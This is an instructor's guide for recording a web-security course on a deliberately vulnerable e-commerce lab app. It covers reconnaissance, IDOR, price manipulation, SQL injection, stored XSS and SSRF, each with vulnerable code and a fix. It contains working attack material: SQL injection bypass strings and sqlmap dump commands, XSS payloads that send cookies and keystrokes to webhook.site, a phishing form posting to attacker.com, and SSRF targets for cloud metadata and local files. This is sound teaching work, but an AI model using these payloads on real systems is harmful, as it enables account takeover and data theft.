# ShopEase - Instructor's Exploitation Guide

This document provides detailed step-by-step instructions for demonstrating each vulnerability during course recording. Each section includes setup, exploitation, and remediation guidance.

---

## Pre-Recording Checklist

- [ ] VPS is running and accessible
- [ ] Application is deployed via `docker-compose up -d`
- [ ] All services healthy: `docker-compose ps`
- [ ] Screen recording software configured (1920x1080 minimum)
- [ ] Burp Suite configured and proxy set
- [ ] Browser DevTools open (F12)
- [ ] Postman collection ready (optional)
- [ ] Test accounts ready (see MODULES.md)

---

## Module 0: Reconnaissance & Setup

### Learning Objectives
- Information gathering techniques
- Understanding application structure
- Identifying attack surface

### Demonstration Steps

1. **Manual Exploration**
```bash
# Start with homepage
http://YOUR_VPS_IP/

# Browse products, check source code
View Page Source → Look for comments, hidden fields

# Check common files
http://YOUR_VPS_IP/robots.txt
http://YOUR_VPS_IP/sitemap.xml
http://YOUR_VPS_IP/.git/
```

2. **robots.txt Discovery**
```
Visit: http://YOUR_VPS_IP/robots.txt

Shows:
Disallow: /zevon-admin
Disallow: /api/debug
Disallow: /api/users

This reveals hidden endpoints!
```

3. **Directory Brute Force** (Optional - show tool usage)
```bash
# Using ffuf
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://YOUR_VPS_IP/FUZZ

# Using gobuster
gobuster dir -u http://YOUR_VPS_IP/ -w /usr/share/wordlists/dirb/common.txt
```

4. **Subdomain Enumeration** (If applicable)
```bash
# Using subfinder
subfinder -d shopease.in

# Using amass
amass enum -d shopease.in
```

### Key Talking Points
- Always start with passive reconnaissance
- robots.txt often reveals sensitive paths
- Application behavior reveals architecture
- Map the entire application before attacking

---

## Module A01-1: IDOR - Order Detail Vulnerability

### Vulnerability Location
Route: `/orders/:id`  
File: `app/routes/orders.js:14-31`

### Setup
1. Register two user accounts:
   - User A: `student1@test.com` / `password123`
   - User B: `student2@test.com` / `password123`
2. Place orders from both accounts

### Step-by-Step Exploitation

**Phase 1: Normal Behavior**
1. Login as User A
2. Navigate to "My Orders"
3. Click on order (e.g., Order #11)
4. URL: `http://YOUR_VPS_IP/orders/11`
5. Show: "This is expected - I can see MY order"

**Phase 2: IDOR Attack**
1. Change URL to `/orders/1`
2. Show: Full order details for Order #1 (belonging to different user)
3. Highlight exposed data:
   - Customer name
   - Email address
   - Delivery address
   - Order items and prices
   - Order date

**Phase 3: Automated Enumeration**
```bash
# Using curl in a loop
for i in {1..10}; do
  curl -s -b "connect.sid=YOUR_SESSION_COOKIE" \
  "http://YOUR_VPS_IP/orders/$i" | grep "user_name"
done
```

**Phase 4: Burp Suite Intruder**
1. Capture `/orders/5` request in Burp
2. Send to Intruder
3. Set order ID as payload position: `/orders/§5§`
4. Payload type: Numbers (1-100)
5. Start attack
6. Filter responses by status code 200
7. Extract all orders with grep function

### Code Analysis (Show in VS Code)
```javascript
// Vulnerable code - no authorization check
router.get('/orders/:id', async (req, res) => {
  if (!req.session.userId) {
    return res.redirect('/login');
  }
  
  const { id } = req.params;
  
  // BUG: No check if req.session.userId === order.user_id
  const orderQuery = `SELECT * FROM orders WHERE id = ${id}`;
  // ...
});
```

### Remediation (Show Secure Code)
```javascript
// Secure version
router.get('/orders/:id', async (req, res) => {
  if (!req.session.userId) {
    return res.redirect('/login');
  }
  
  const { id } = req.params;
  
  // FIX: Verify ownership
  const orderQuery = `SELECT * FROM orders WHERE id = ? AND user_id = ?`;
  const [orders] = await db.query(orderQuery, [id, req.session.userId]);
  
  if (orders.length === 0) {
    return res.status(403).send('Access denied or order not found');
  }
  // ...
});
```

### Impact Discussion
- Privacy breach - PII exposure
- Competitor intelligence (business orders)
- GDPR/CCPA violations
- Customer trust damage

---

## Module A01-2: Price Manipulation

### Vulnerability Location
Route: `/checkout` POST  
File: `app/routes/cart.js:58-92`

### Setup
1. Login as any user
2. Add expensive product to cart (iPhone 15 Pro Max - ₹159,900)

### Step-by-Step Exploitation

**Phase 1: Normal Checkout Flow**
1. Add iPhone to cart
2. Navigate to checkout
3. Show total: ₹159,900

**Phase 2: Inspect Hidden Fields**
1. Open DevTools (F12) → Elements tab
2. Expand checkout form
3. Show hidden inputs with price data:
```html
<input type="hidden" class="item-data" 
       data-id="1" 
       data-price="159900" 
       data-quantity="1">
```

**Phase 3: Modify Price**
1. Right-click on `data-price="159900"`
2. Edit Attribute → Change to `data-price="1"`
3. Complete checkout with delivery address
4. Submit order

**Phase 4: Verify Attack Success**
1. Check "My Orders"
2. Order total shows: ₹1.00 instead of ₹159,900
3. Admin panel → Orders → Verify order in database

### Alternative Attack Vector (Burp Suite)
1. Complete checkout normally but intercept POST request
2. Modify JSON payload:
```json
{
  "address": "123 Street",
  "items": "[{\"id\":1,\"price\":1,\"quantity\":1}]"
}
```
3. Forward modified request

### Code Analysis
```javascript
// Vulnerable code
router.post('/checkout', async (req, res) => {
  const { address, items } = req.body;
  const parsedItems = JSON.parse(items);
  
  let total = 0;
  parsedItems.forEach(item => {
    // BUG: Using client-provided price!
    total += parseFloat(item.price) * parseInt(item.quantity);
  });
  
  // Saves manipulated price to database
  const orderQuery = `INSERT INTO orders (user_id, total, ...) VALUES (...)`;
  // ...
});
```

### Remediation
```javascript
// Secure version
router.post('/checkout', async (req, res) => {
  const { address, items } = req.body;
  const parsedItems = JSON.parse(items);
  
  let total = 0;
  
  for (const item of parsedItems) {
    // FIX: Fetch actual price from database
    const [products] = await db.query(
      'SELECT price FROM products WHERE id = ?', 
      [item.id]
    );
    
    if (products.length === 0) {
      return res.status(400).json({ error: 'Invalid product' });
    }
    
    // Use server-side price, not client price
    total += products[0].price * item.quantity;
  }
  
  // Now save with validated total
  // ...
});
```

### Impact Discussion
- Direct financial loss
- Inventory/accounting discrepancies
- Business logic bypass
- Revenue manipulation

---

## Module A02-1: Plain Text Passwords

### Vulnerability Location
Database: `users` table  
Admin View: `app/views/admin/users.ejs`

### Step-by-Step Demonstration

**Phase 1: Show Database Schema**
```bash
# Access MySQL container
docker-compose exec db mysql -u shopease_user -pshopease_pass shopease

# Show table structure
DESCRIBE users;

# Show sample data
SELECT id, name, email, password, role FROM users LIMIT 5;
```

**Phase 2: Admin Panel Access**
1. Navigate to `/zevon-admin` (from robots.txt)
2. Login: `admin@shopease.in` / `admin123`
3. Click "Users" in sidebar
4. Full table with password column visible

**Phase 3: Show Impact**
1. Pick any user's plain text password
2. Logout as admin
3. Login as that user with stolen password
4. Full account takeover

### Alternative Discovery Method
```bash
# If attacker gains shell access
docker-compose exec app cat /proc/self/environ
# Shows DB_PASS environment variable

# Direct database access
mysql -h VPS_IP -u shopease_user -pshopease_pass shopease
SELECT email, password FROM users WHERE role='admin';
```

### Code Analysis
```javascript
// Vulnerable registration
router.post('/register', async (req, res) => {
  const { name, email, password, phone, address } = req.body;
  
  // BUG: Storing password as-is
  const query = `INSERT INTO users (name, email, password, ...) 
                 VALUES ('${name}', '${email}', '${password}', ...)`;
  await db.query(query);
});
```

### Remediation
```javascript
// Secure version
const bcrypt = require('bcrypt');

router.post('/register', async (req, res) => {
  const { name, email, password, phone, address } = req.body;
  
  // FIX: Hash password with bcrypt
  const saltRounds = 10;
  const hashedPassword = await bcrypt.hash(password, saltRounds);
  
  const query = `INSERT INTO users (name, email, password, ...) 
                 VALUES (?, ?, ?, ?, ?)`;
  await db.query(query, [name, email, hashedPassword, phone, address]);
});

// Login verification
router.post('/login', async (req, res) => {
  const { email, password } = req.body;
  
  const [users] = await db.query('SELECT * FROM users WHERE email = ?', [email]);
  
  if (users.length === 0) {
    return res.render('login', { error: 'Invalid credentials' });
  }
  
  // FIX: Compare with bcrypt
  const match = await bcrypt.compare(password, users[0].password);
  
  if (!match) {
    return res.render('login', { error: 'Invalid credentials' });
  }
  
  // Proceed with login...
});
```

### Impact Discussion
- Complete account takeover
- Database breach = all accounts compromised
- Compliance violations (PCI-DSS, GDPR)
- Credential stuffing attacks (users reuse passwords)

---

## Module A03-1: SQL Injection - Login Bypass

### Vulnerability Location
Route: `/login` POST  
File: `app/routes/auth.js:8-29`

### Step-by-Step Exploitation

**Phase 1: Normal Login**
1. Navigate to `/login`
2. Try: `rajesh@gmail.com` / `wrongpassword`
3. Error: "Invalid email or password"

**Phase 2: SQL Injection Attack**
1. Email field: `' OR '1'='1' --`
2. Password field: `anything`
3. Click "Login"
4. Successfully logged in as admin!

**Phase 3: Show SQL Query**
```sql
-- What the application builds:
SELECT * FROM users WHERE email = '' OR '1'='1' --' AND password = 'anything'

-- After SQL parsing:
SELECT * FROM users WHERE email = '' OR '1'='1'
-- Rest is commented out

-- Result: Returns all users, application takes first row (admin)
```

**Phase 4: Burp Suite Analysis**
1. Capture login request
2. Show POST data:
```
email='%20OR%20'1'%3D'1'%20--&password=anything
```
3. Highlight how payload is URL-encoded
4. Show response - successful authentication

**Phase 5: Advanced Payloads**
```sql
-- Login as specific user
admin@shopease.in' --

-- Enumerate database version
' UNION SELECT @@version,2,3,4,5,6,7 --

-- Time-based blind SQLi (detect vulnerability)
' OR SLEEP(5) --
```

### Automated Testing with sqlmap
```bash
# Save login request to file
# Then run sqlmap
sqlmap -r login_request.txt --level=5 --risk=3 --batch

# Dump users table
sqlmap -r login_request.txt -D shopease -T users --dump
```

### Code Analysis
```javascript
// Vulnerable code
router.post('/login', async (req, res) => {
  const { email, password } = req.body;
  
  // BUG: String concatenation!
  const query = `SELECT * FROM users WHERE email = '${email}' AND password = '${password}'`;
  const [users] = await db.query(query);
  
  if (users.length > 0) {
    // Login successful
  }
});
```

### Remediation
```javascript
// Secure version - Parameterized Queries
router.post('/login', async (req, res) => {
  const { email, password } = req.body;
  
  // FIX: Use prepared statements
  const query = 'SELECT * FROM users WHERE email = ?';
  const [users] = await db.query(query, [email]);
  
  if (users.length === 0) {
    return res.render('login', { error: 'Invalid credentials' });
  }
  
  // FIX: Use bcrypt for password comparison
  const match = await bcrypt.compare(password, users[0].password);
  
  if (!match) {
    return res.render('login', { error: 'Invalid credentials' });
  }
  
  // Proceed with login
});
```

### Impact Discussion
- Authentication bypass
- Database takeover
- Data exfiltration
- System compromise via database functions

---

## Module A03-3: Stored XSS via Contact Form

### Vulnerability Location
Route: `/contact` POST → `/zevon-admin/messages`  
Files: `app/routes/contact.js`, `app/views/admin/messages.ejs`

### Step-by-Step Exploitation

**Phase 1: Simple Alert XSS**
1. Navigate to `/contact`
2. Fill form:
   - Name: `Test User`
   - Email: `test@test.com`
   - Subject: `Inquiry`
   - Message: `<script>alert('XSS Attack!')</script>`
3. Submit form
4. Login as admin → Admin Panel → Messages
5. XSS payload executes!

**Phase 2: Cookie Stealing XSS**
```html
<script>
fetch('https://webhook.site/YOUR-WEBHOOK-ID', {
  method: 'POST',
  body: JSON.stringify({
    cookie: document.cookie,
    page: window.location.href
  })
});
</script>
```

**Phase 3: Show Attack in Action**
1. Submit cookie-stealing payload
2. Show webhook.site waiting for request
3. Admin opens messages
4. Webhook receives admin's session cookie
5. Demonstrate session hijacking:
```bash
# Use stolen cookie in curl
curl -H "Cookie: connect.sid=STOLEN_COOKIE_VALUE" \
     http://YOUR_VPS_IP/zevon-admin
```

**Phase 4: Advanced Payloads**

**BeEF Hook (if BeEF is set up)**
```html
<script src="http://YOUR_BEEF_SERVER:3000/hook.js"></script>
```

**Keylogger**
```html
<script>
document.onkeypress = function(e) {
  fetch('https://webhook.site/ID?key=' + e.key);
}
</script>
```

**Fake Login Form (Phishing)**
```html
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999">
  <h2>Session Expired - Please Login Again</h2>
  <form action="https://attacker.com/steal" method="POST">
    <input name="email" placeholder="Email"><br>
    <input name="password" type="password" placeholder="Password"><br>
    <button>Login</button>
  </form>
</div>
```

### Code Analysis
```javascript
// Vulnerable storage (no sanitization)
router.post('/contact', async (req, res) => {
  const { name, email, subject, message } = req.body;
  
  // BUG: No input validation or sanitization
  const query = `INSERT INTO contact_messages (name, email, subject, message) 
                 VALUES ('${name}', '${email}', '${subject}', '${message}')`;
  await db.query(query);
});
```

```html
<!-- Vulnerable rendering -->
<div class="card-body">
  <p class="mb-0"><strong>Message:</strong></p>
  <div class="border-start border-3 ps-3 mt-2">
    <%- msg.message %>  <!-- BUG: Unescaped rendering! -->
  </div>
</div>
```

### Remediation
```javascript
// Secure version
const xss = require('xss');

router.post('/contact', async (req, res) => {
  let { name, email, subject, message } = req.body;
  
  // FIX: Sanitize all inputs
  name = xss(name);
  email = xss(email);
  subject = xss(subject);
  message = xss(message);
  
  // Use parameterized query
  const query = `INSERT INTO contact_messages (name, email, subject, message) 
                 VALUES (?, ?, ?, ?)`;
  await db.query(query, [name, email, subject, message]);
});
```

```html
<!-- Secure rendering -->
<div class="card-body">
  <p class="mb-0"><strong>Message:</strong></p>
  <div class="border-start border-3 ps-3 mt-2">
    <%= msg.message %>  <!-- FIX: Escaped rendering -->
  </div>
</div>
```

### Impact Discussion
- Session hijacking
- Admin account takeover
- Persistent malware delivery
- Phishing attacks against other admins

---

## Module A10: SSRF - Image URL Fetch

### Vulnerability Location
Route: `/zevon-admin/products/add` POST  
File: `app/routes/admin.js:58-77`

### Step-by-Step Exploitation

**Phase 1: Normal Usage**
1. Login as admin
2. Admin Panel → Products → Add Product
3. Image URL: `https://via.placeholder.com/300`
4. Show: Server fetches external URL

**Phase 2: Internal API Access**
1. Add Product with Image URL: `http://localhost:3000/api/debug`
2. Check application logs:
```bash
docker-compose logs app | grep -A 5 "Fetched image"
```
3. Show: Internal API response logged

**Phase 3: Database Port Scanning**
1. Image URL: `http://db:3306`
2. Logs show connection attempt to MySQL
3. Can scan internal ports: `http://localhost:22`, `http://localhost:6379`

**Phase 4: Cloud Metadata (if on AWS/GCP/Azure)**
```
AWS: http://169.254.169.254/latest/meta-data/
GCP: http://metadata.google.internal/computeMetadata/v1/
Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

**Phase 5: File Protocol (if enabled)**
```
file:///etc/passwd
file:///proc/self/environ
```

### Code Analysis
```javascript
// Vulnerable code
router.post('/products/add', checkAdmin, async (req, res) => {
  const { name, description, price, stock, category, image_url } = req.body;
  
  // BUG: No URL validation!
  if (image_url && image_url.startsWith('http')) {
    const response = await fetch(image_url);
    console.log(`Fetched image from ${image_url}: ${response.status}`);
  }
  // ...
});
```

### Remediation
```javascript
// Secure version
const url = require('url');

router.post('/products/add', checkAdmin, async (req, res) => {
  const { name, description, price, stock, category, image_url } = req.body;
  
  if (image_url && image_url.startsWith('http')) {
    // FIX: URL validation
    const parsedUrl = url.parse(image_url);
    
    // Whitelist allowed domains
    const allowedDomains = ['via.placeholder.com', 'images.shopease.in'];
    
    if (!allowedDomains.includes(parsedUrl.hostname)) {
      return res.status(400).send('Invalid image URL domain');
    }
    
    // Block internal IPs
    const blockedIPs = ['127.0.0.1', 'localhost', '0.0.0.0', '169.254.169.254'];
    if (blockedIPs.includes(parsedUrl.hostname)) {
      return res.status(400).send('Internal URLs not allowed');
    }
    
    // Additional: Block private IP ranges
    // 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16
    
    try {
      const response = await fetch(image_url, {
        timeout: 5000,
        redirect: 'manual' // Prevent redirect to internal URLs
      });
      console.log(`Fetched image from ${image_url}: ${response.status}`);
    } catch (err) {
      return res.status(400).send('Failed to fetch image');
    }
  }
  // ...
});
```

### Impact Discussion
- Internal network scanning
- Cloud credentials theft
- Access to internal APIs
- Pivot point for further attacks

---

## Post-Exploitation: Full System Compromise Chain

### Chaining Multiple Vulnerabilities

**Scenario: From Guest to Full Admin Control**

1. **Reconnaissance** → Find `/robots.txt` → Discover admin panel
2. **SQL Injection** → Bypass login → Access as admin
3. **Stored XSS** → Steal real admin session → Persistent access
4. **SSRF** → Scan internal network → Find other services
5. **IDOR** → Enumerate all user data → Data exfiltration
6. **Price Manipulation** → Financial fraud → Cover tracks

**Live Demonstration Flow**:
```bash
# 1. Recon
curl http://VPS_IP/robots.txt

# 2. SQL Injection login
curl -c cookies.txt -d "email='OR'1'='1'--&password=x" http://VPS_IP/login

# 3. IDOR - Dump all orders
for i in {1..50}; do
  curl -b cookies.txt http://VPS_IP/orders/$i >> orders_dump.txt
done

# 4. XSS - Plant persistent payload
curl -b cookies.txt -d "name=x&email=x&subject=x&message=<script>/* evil */</script>" \
     http://VPS_IP/contact

# 5. SSRF - Internal recon
# (Via admin panel UI)
```

---

## Common Student Mistakes & Troubleshooting

### SQL Injection Not Working
- Forgot to URL-encode special characters
- Using wrong comment syntax (use `--` with space or `#`)
- Application might have minimal filtering - try variations

### XSS Not Triggering
- Browser XSS auditor blocking (disable in Chrome flags)
- Check if admin actually visited the page
- Try different event handlers: `<img src=x onerror=alert(1)>`

### IDOR Returns 404
- Order ID doesn't exist - try different range
- Check if logged in (session required)
- Some orders might be deleted

### SSRF No Response
- Check logs instead of expecting visible output
- Try different internal IPs
- Cloud metadata might not apply to VPS

---

## Recording Best Practices

1. **Screen Setup**: 1920x1080, hide personal bookmarks
2. **Pacing**: Slow down when typing commands, explain each step
3. **Highlight**: Use screen annotation tools for emphasis
4. **Zoom**: Zoom in on code sections and terminal output
5. **Repetition**: Show each exploit twice - once explained, once fast
6. **Cleanup**: Reset database between takes: `docker-compose down -v && docker-compose up -d`

---

## Safety Reminders for Students

Always communicate during recordings:
- This is a controlled, educational environment
- Never test on production systems without written authorization
- Many of these vulnerabilities have legal consequences in real-world scenarios
- Bug bounty programs have specific rules of engagement
- Always practice responsible disclosure

---

## Additional Resources for Course

- OWASP Top 10 documentation
- PortSwigger Web Security Academy
- OWASP WebGoat
- HackTheBox / TryHackMe
- Bug bounty platforms (HackerOne, Bugcrowd)

---

## Quick Reference: All Vulnerable Endpoints

| Endpoint | Vulnerability | Exploitation Tool |
|----------|---------------|-------------------|
| `/login` | SQL Injection | Burp Suite, sqlmap |
| `/products?search=` | SQL Injection + XSS | Browser, Burp Suite |
| `/orders/:id` | IDOR | Browser, Burp Intruder |
| `/checkout` | Price Manipulation | Browser DevTools |
| `/contact` | Stored XSS | Browser |
| `/profile/update` | Mass Assignment | Postman, curl |
| `/reset-password` | No verification | Postman, curl |
| `/api/debug` | Info Disclosure | Browser, curl |
| `/zevon-admin/products/add` | SSRF | Browser |
| All routes | No rate limiting | Burp Intruder |

---

Good luck with your course recording! 🎥
